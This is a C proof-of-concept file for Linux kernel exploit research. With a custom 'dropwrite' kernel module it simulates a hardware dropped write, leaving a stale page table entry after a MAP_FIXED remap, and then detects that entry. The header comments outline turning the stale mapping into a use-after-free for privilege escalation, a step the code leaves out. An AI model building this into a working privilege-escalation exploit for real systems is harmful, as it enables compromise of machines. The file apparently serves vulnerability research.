/*
 * Linux LPE PoC driven by the `dropwrite` LKM instead of the flaky
 * mem-scanning race in simulate_dropped_write.py.
 *
 * The LKM deterministically reproduces a DRAM "dropped write" that lands on a
 * leaf PTE during an mmap(MAP_FIXED) over-map: it lets the kernel zap+free the
 * old page as usual, then re-stamps the old PTE value back, leaving a present
 * PTE whose VMA now points elsewhere -- a stale mapping (which the exploit then
 * turns into a UAF via fallocate(PUNCH_HOLE) on the old memfd).
 *
 * This PoC goes as far as *deterministically establishing and detecting* the
 * stale PTE. Punch-hole + grooming the freed PFN with the target object is the
 * next step, left out for now.
 *
 * Requires the dropwrite module loaded (see run_lkm.sh). Run as root (the
 * debugfs arm knob lives under /sys/kernel/debug, which is root-only).
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>

#define ONE_MB   0x100000UL
#define SZ       (2 * ONE_MB)          /* one PMD worth */
#define MAGIC_A  0xaaaaaaaau
#define MAGIC_B  0xbbbbbbbbu
#define ARM_PATH "/sys/kernel/debug/dropwrite/arm"

/* memfd filled with `magic` at the start of every page so any page reveals
 * which memfd backs it. */
static int mk(const char *name, uint32_t magic)
{
	int fd = memfd_create(name, 0);
	if (fd < 0) { perror("memfd_create"); return -1; }
	if (ftruncate(fd, SZ)) { perror("ftruncate"); return -1; }
	for (off_t o = 0; o < SZ; o += 0x1000) {
		if (lseek(fd, o, SEEK_SET) < 0) { perror("lseek"); return -1; }
		if (write(fd, &magic, 4) != 4) { perror("write"); return -1; }
	}
	return fd;
}

/* one-shot arm the LKM to drop the zap of `vaddr`'s leaf PTE in this mm */
static int arm_drop(unsigned long vaddr)
{
	char buf[32];
	int n, fd = open(ARM_PATH, O_WRONLY);
	if (fd < 0) { perror("open " ARM_PATH " (module loaded?)"); return -1; }
	n = snprintf(buf, sizeof buf, "0x%lx", vaddr);
	if (write(fd, buf, n) != n) { perror("arm write"); close(fd); return -1; }
	close(fd);
	return 0;
}

int main(void)
{
	setbuf(stdout, NULL); /* flush each line before any teardown wedge */

	printf("hello\n");

	int a = mk("A", MAGIC_A), b = mk("B", MAGIC_B);
	if (a < 0 || b < 0)
		return 2;

	/*
	 * Carve a 2MB-aligned window so A occupies exactly one PMD. The
	 * SZ-0x1000 remap below then keeps A's last page mapped, which keeps
	 * that PMD's leaf pte-page alive across the teardown (the "don't move
	 * the L2" trick) -- so the stale PTE the LKM restores stays valid.
	 */
	void *res = mmap(NULL, SZ * 2, PROT_NONE,
			 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (res == MAP_FAILED) { perror("reserve"); return 2; }
	void *p = (void *)(((uintptr_t)res + (SZ - 1)) & ~(uintptr_t)(SZ - 1));

	if (mmap(p, SZ, PROT_READ | PROT_WRITE,
		 MAP_SHARED | MAP_FIXED | MAP_POPULATE, a, 0) == MAP_FAILED) {
		perror("map A"); return 2;
	}

	uint32_t before = *(volatile uint32_t *)p;
	printf("[*] A mapped @ %p reads 0x%08x (want A=0x%08x)\n",
	       p, before, MAGIC_A);
	if (before != MAGIC_A) { printf("[!] setup wrong\n"); return 2; }

	if (arm_drop((unsigned long)p))
		return 2;
	printf("[*] armed dropped-zap for %p\n", p);

	/* MAP_FIXED remap to B, SZ-0x1000 to keep A's last page (and the PMD). */
	if (mmap(p, SZ - 0x1000, PROT_READ | PROT_WRITE,
		 MAP_SHARED | MAP_FIXED | MAP_POPULATE, b, 0) == MAP_FAILED) {
		perror("remap B"); return 2;
	}

	uint32_t after = *(volatile uint32_t *)p;
	printf("[*] after remap to B, %p reads 0x%08x\n", p, after);

	if (after == MAGIC_A) {
		printf("[+] STALE PTE: VMA points at B but the PTE still "
		       "resolves to A's page -- dropped zap store confirmed\n");
		return 0;
	}
	if (after == MAGIC_B) {
		printf("[-] no drop (reads B): LKM didn't fire or PTE was "
		       "re-installed\n");
		return 1;
	}
	printf("[-] unexpected read 0x%08x\n", after);
	return 1;
}
